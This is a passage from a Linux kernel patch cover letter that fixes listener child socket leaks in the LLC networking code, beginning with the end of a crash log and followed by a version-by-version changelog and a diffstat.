[ 1665.732318][T10284] RBP: 00007ffcc17c9412 R08: 00007ffcc17c9420 R09: 0000000000000014

[ 1665.732904][T10284] R10: 0000000000000000 R11: 0000000000000202 R12: 0000559e433d10c6

[ 1665.733491][T10284] R13: d288ce703afb7e91 R14: 0000000000019194 R15: 0000000000000004

[ 1665.734120][T10284]  </TASK>
-----END crash log-----

changes in v7:
  - Drop the companion LLC_CONN_OUT_OF_SVC bounds patch due to overlap with
    Kees Cook's net-next series:
    https://lore.kernel.org/all/20260901210300.i.590-kees@kernel.org/
  - That series also covers the connect(2) +1 return and rejecting
    out-of-service states before table lookup, as raised in review of
    v6 2/2:
    https://lore.kernel.org/all/20260902010052.2297527-1-kuba@kernel.org/
  - Keep only the listener child leak fix for net.
  - Fix reverse-xmas-tree local ordering in llc_conn_handler() and
    llc_incoming_sock_work(), align the atomic_cmpxchg() continuation,
    and add matching braces on the backlog retry if/else.
  - Release a PENDING child when llc_conn_handler() sees a redirected
    packet for a TCP_LISTEN socket that is already SOCK_DEAD, instead of
    dropping the packet and leaving that cleanup only to close().
  - Keep the init_net CAP_NET_RAW/CAP_NET_ADMIN reproducer; PF_LLC is
    rejected outside init_net, so unshare -Urn cannot express this path.
  - Spell out that the crash PoC is DISC-only, include poc-sabme.c for
    the accept and close paths, and restore the full OOM panic so the
    leftover /proc/net/llc/socket leak is described next to that log.
  - Do not tear down an already pending child when a redirected frame
    fails sk_add_backlog(); drop that frame only.
  - Track incoming children on the listener and release leftover PENDING
    sockets from that list on close(), instead of relying only on
    sk_receive_queue, backlog drain, or a later SOCK_DEAD packet.
  - Stop taking the listener lock in llc_incoming_sock_work(); the child
    already holds the listener, and teardown no longer interleaves with
    llc_ui_release()'s llc_sk_free().
  - Hold a child socket reference on handshake skbs with
    skb_set_owner_sk_safe(), so kfree_skb() cannot race asynchronous
    teardown through sock_rfree().
  - Finish sock_orphan() and the device put in llc_incoming_sock_work()
    before llc_sk_free(), so those steps do not run after its sock_put().
  - Keep the v1 lore Link on its own line, before the numbered-patch
    diffstat.
  - Include the original leak-only leftover /proc/net/llc/socket count
    next to the later panic_on_oom log.
  - v6 Link: https://lore.kernel.org/all/cover.1787752861.git.zihanx@nebusec.ai/
changes in v6:
  - Hold a reference for children queued for accept() and release it when they
    are dequeued, while retaining SAP publication so tuple lookup still finds
    a pending child before the passive open completes.
  - Make direct receive, backlog, accept-queue, and listener-close cleanup
    symmetric, with bottom-half-disabled child locking in process context.
  - Keep the LLC_CONN_OUT_OF_SVC lower-bound check in its separate patch and
    use the ADM state boundary consistently.
  - v5 Link: https://lore.kernel.org/all/20260822082354.3109-1-zihanx@nebusec.ai/
changes in v5:
  - Make listener child cleanup unconditional so queued children are also
    released if the socket leaves TCP_LISTEN before close.
  - Serialize process-context child cleanup and backlog dispatch with bottom
    halves disabled, avoiding child-lock acquisition races with LLC receive
    and timer paths.
  - Drop packets redirected through a pending child after its listener is no
    longer listening, and release children left out of service instead of
    dispatching them.
  - Split the LLC_CONN_OUT_OF_SVC lower-bound check into a separate patch.
  - v4 Link: https://lore.kernel.org/all/20260814185843.4748-1-zihanx@nebusec.ai/
changes in v4:
  - Create a passive-open child only for SABME and generate listener-side DM
    replies directly for non-SABME commands.
  - Use an atomic incoming-child lifecycle and serialize pending-child lookup,
    backlog processing, rollback, and listener close with the child lock.
  - Keep immediate SAP publication for passive-open tuple matching, but release
    unaccepted children on direct and backlog failures and on listener close.
  - Defer final incoming-child cleanup to workqueue context so timer
    synchronization does not run in the receive softirq path.
  - Add an LLC state lower-bound check before state-table dispatch.
  - v3 Link: https://lore.kernel.org/all/20260805175945.10698-1-zihanx@nebusec.ai/
changes in v3:
  - Drop the unused llc_conn_handler() local rc variable reported in review.
  - Rebase the numbered patch and cover onto commit
    ede76849012e45ffb2193ad110b42027eec02c5c.
  - v2 Link: https://lore.kernel.org/all/cover.1785386749.git.zihanx@nebusec.ai/
changes in v2:
  - Rework the fix to preserve the existing passive-open tuple matching
    semantics instead of deferring child publication until LLC_CONN_PRIM.
  - Track listener-created children pending publication to accept(), and roll
    them back on every earlier failure or drop path.
  - Cover the original non-SABME leak and SABME paths which fail before
    LLC_CONN_PRIM, including backlog enqueue and backlog drop failures.
  - Correct Fixes to 1da177e4c3f4 ("Linux-2.6.12-rc2") based on the earliest
    locally visible history carrying the same root-cause fact.
  - Clarify panic_on_oom crash evidence and packetdrill selection.
  - v1 Link: https://lore.kernel.org/all/cover.1784725007.git.zihanx@nebusec.ai/

Best regards,
Zihan Xi

Zihan Xi (1):
  llc: fix listener child socket leaks before passive open completes

 include/net/llc_conn.h |  15 +-
 net/llc/af_llc.c       |  22 ++-
 net/llc/llc_conn.c     | 312 +++++++++++++++++++++++++++++++++++++++--
 3 files changed, 335 insertions(+), 14 deletions(-)

-- 
2.43.0

